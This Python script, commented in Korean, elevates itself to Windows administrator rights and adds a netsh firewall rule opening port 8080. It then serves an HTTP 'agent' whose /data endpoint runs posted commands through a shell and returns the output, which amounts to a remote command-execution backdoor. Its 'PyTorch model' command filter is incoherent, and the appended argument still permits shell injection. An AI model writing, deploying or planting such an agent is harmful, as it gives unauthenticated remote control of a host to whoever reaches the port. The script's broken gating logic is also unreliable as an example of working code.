# -*- coding: utf-8 -*-

import os
import sys
import ctypes
import json
import subprocess
import torch
from http.server import BaseHTTPRequestHandler, HTTPServer

# 더미 PyTorch 모델 (실제로는 복잡한 모델을 로드할 수 있음)
class DummyModel(torch.nn.Module):
    def forward(self, x):
        return "exec" if x == "run something" else "unknown"

# 모델 로드
model = DummyModel()

# 현재 실행 중인 사용자가 관리자 권한을 가지고 있는지 확인합니다.
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# 프로그램을 관리자 권한으로 실행합니다.
def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

# 방화벽 규칙을 추가하여 특정 포트를 열어줍니다.
def add_firewall_rule(port):
    try:
        subprocess.run(f"netsh advfirewall firewall add rule name=\"Open Port {port}\" dir=in action=allow protocol=TCP localport={port}", shell=True, check=True)
        print(f"Successfully added firewall rule for port {port}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add firewall rule for port {port}. Error: {e}")

# 외부에서 전달받은 명령어를 실행하고 결과를 반환합니다.
def exec_command(command, arg):
    # PyTorch 모델로 명령 분석
    model_result = model(command)
    if model_result == "unknown":
        return {"status": "error", "message": "Unknown command"}

    try:
        result = subprocess.check_output(f"{command} {arg}", shell=True).decode('utf-8')
        return {"status": "success", "output": result}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# HTTP 요청을 처리하는 클래스
class MyRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/ping":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "Agent is alive"}).encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)

        if self.path == "/data":
            command = data.get("command")
            arg = data.get("arg")
            if command:
                response = exec_command(command, arg)
            else:
                response = {"status": "error", "message": "No command provided"}
        else:
            response = {"status": "error", "message": "Invalid path"}

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

# 서버를 실행하는 함수
def run_server(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, MyRequestHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

# 메인 실행 로직
if __name__ == "__main__":
    if is_admin():
        add_firewall_rule(8080)
        run_server()
    else:
        print("Trying to get admin privileges...")
        run_as_admin()
